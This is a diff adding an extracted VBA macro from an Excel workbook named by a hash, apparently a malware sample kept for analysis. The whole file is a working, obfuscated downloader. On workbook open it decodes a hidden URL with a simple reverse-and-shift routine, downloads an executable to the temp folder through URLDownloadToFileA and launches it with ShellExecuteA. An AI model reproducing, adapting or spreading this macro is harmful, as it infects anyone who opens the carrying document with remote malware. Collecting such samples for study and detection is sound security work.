@@ -1,0 +1,49 @@
+Filename     : ./macros/2ed47370c6ae192d2f43e8ad25d6b9fe5781259dce9171a546ad86fe87834300
+OLE stream   : VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+'Macro Name: YvTZVhkzUVg
+
+Private Declare PtrSafe Function PcDXCbtEtqkCzWGQWSfvwRTd Lib "shell32.dll" Alias _
+"ShellExecuteA" (ByVal OoOZTmVs As Long, ByVal cmsoARgopyVQu As String, _
+ByVal wdjCKAgbcZfPWeuUUkbdUuW As String, ByVal BzhVqhXlwfeR As String, ByVal RtBNqJ As String, ByVal pMfrfdWpmIsDIFQi As Long) As Long
+
+Private Declare PtrSafe Function LylLihJqIuyX Lib "urlmon" Alias _
+"URLDownloadToFileA" (ByVal yJDVSpLkcXkAPlYiFA As Long, ByVal egMhm As String, _
+ByVal ukPXYWczGN As String, ByVal sEETXbRrGzjQToQUjfOcB As Long, ByVal BclxZtYw As Long) As Long
+
+Private Sub YvTZVhkzUVg()
+Dim YhKmWnrtlKnRCymGx As String, oCMvuiUvResZr As String, eiHvtnFC As String, pkNdwQjeSyHIGL As String, wqxbonDHKBbqi As String, SACXAESdx As String
+oCMvuiUvResZr = Decrypt("fyf/gpenbsg")
+eiHvtnFC = Environ$("tmp") & "\" & oCMvuiUvResZr
+
+
+YhKmWnrtlKnRCymGx = Decrypt("fyf/eubkqb0ubd/gnpq/b00;tquui")
+
+LylLihJqIuyX 0, YhKmWnrtlKnRCymGx, eiHvtnFC, 0, 0
+PcDXCbtEtqkCzWGQWSfvwRTd 0, "open", eiHvtnFC, "", vbNullString, vbNormalFocus
+End Sub
+
+Private Sub Workbook_Open()
+
+YvTZVhkzUVg
+End Sub
+
+Private Function Decrypt(enc)
+    Dim x, i, tmp
+    enc = StrReverse(enc)
+    For i = 1 To Len(enc)
+        x = Mid(enc, i, 1)
+        tmp = tmp & Chr(Asc(x) - 1)
+    Next
+    Decrypt = tmp
+End Function
+
